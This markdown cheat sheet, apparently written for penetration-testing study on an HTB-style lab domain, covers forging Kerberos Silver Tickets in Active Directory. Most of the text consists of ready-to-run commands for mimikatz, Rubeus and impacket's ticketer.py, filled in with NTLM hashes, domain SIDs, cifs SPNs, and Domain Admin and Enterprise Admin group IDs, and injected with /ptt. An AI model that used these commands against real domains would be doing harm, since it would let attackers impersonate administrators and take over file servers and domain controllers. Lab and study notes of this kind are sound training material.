
> [!Danger] 
> cifs is one of the services that are exists without listing them in SPN list, Implicit Service Support: In Windows AD, machine accounts (like SQL01$) are automatically trusted to authenticate for certain core services without needing explicit SPN registration. SMB/CIFS (file sharing) is one of theseâ€”it's handled by the machine's NTLM/RC4 hash directly. The HOST or RestrictedKrbHost SPNs often cover broader machine-level access, but you can target specific services like cifs in a forged ticket because the validation happens on the target using the machine's key (the hash you have).


To forge a Silver Ticket, an attacker requires:
1. the NTLM password's hash or keys for a service or machine account
2. Domain Name
3. the `SID` of the domain.
4. service name (SPN).
5. an arbitrary username, and group information. "You can use unexisted ones".

---
### Windows
#### mimikatz
```
mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.inlanefreight.local /service:cifs  /ptt
```
#### rubeus
```powershell
Rubeus.exe silver </rc4:HASH> </user:USERNAME> </service:SPN> </domain:DOMAIN> </sid:DOMAIN_SID> [/dc:DOMAIN_CONTROLLER] [/netbios:NETBIOS_DOMAIN] [/dispalyname:PAC_FULL_NAME] [/badpwdcount:INTEGER] [/flags:TICKET_FLAGS] [/uac:UAC_FLAGS] [/groups:GROUP_IDS] [/pgid:PRIMARY_GID] [/homedir:HOMEDIR] [/homedrive:HOMEDRIVE] [/id:USER_ID] [/logofftime:LOGOFF_TIMESTAMP] [/lastlogon:LOGON_TIMESTAMP] [/logoncount:INTEGER] [/passlastset:PASSWORD_CHANGE_TIMESTAMP] [/maxpassage:RELATIVE_TO_PASSLASTSET] [/minpassage:RELATIVE_TO_PASSLASTSET] [/profilepath:PROFILE_PATH] [/scriptpath:LOGON_SCRIPT_PATH] [/sids:EXTRA_SIDS] [[/resourcegroupsid:RESOURCEGROUPS_SID] [/resourcegroups:GROUP_IDS]] [/authtime:AUTH_TIMESTAMP] [/starttime:Start_TIMESTAMP] [/endtime:RELATIVE_TO_STARTTIME] [/renewtill:RELATIVE_TO_STARTTIME] [/rangeend:RELATIVE_TO_STARTTIME] [/rangeinterval:RELATIVE_INTERVAL] [/authdata] [/cname:CLIENTNAME] [/crealm:CLIENTDOMAIN] [/s4uproxytarget:TARGETSPN] [/s4utransitedservices:SPN1,SPN2,...] [/extendedupndns] [/nofullpacsig] [/printcmd] [outfile:FILENAME] [/ptt]
```

```powershell
.\Rubeus.exe silver /user:<User_To_Create_ticket_on_his_name> /rc4:<service_hash> /service:<Wanted_SPNs_On_target> /sid:<SID-of-domain> /domain:<Domain> /groups:513,512,520,518,519 /ptt /nowrap


.\Rubeus.exe silver /user:administrator /rc4:027c6604526b7b16a22e320b76e54a5b /service:cifs/SQL01.INLANEFREIGHT.LOCAL /domain:inlanefreight.local  /groups:513,512,520,518,519 /sid:S-1-5-21-1870146311-1183348186-593267556 /nowrap /ptt
```

### Linux
```sh
ticketer.py <fake-user> -user-id <fake-id> -domain abc.local -domain-sid s-1-5-21 -nthash <hash-of-target-service> -spn <SPN>

ticketer.py htb-student -user-id 1126 -domain "$DOMAIN" -domain-sid S-1-5-21-1870146311-1183348186-593267556 -nthash 542780725df68d3456a0672f59001987 -spn cifs/dc01.inlanefreight.local
```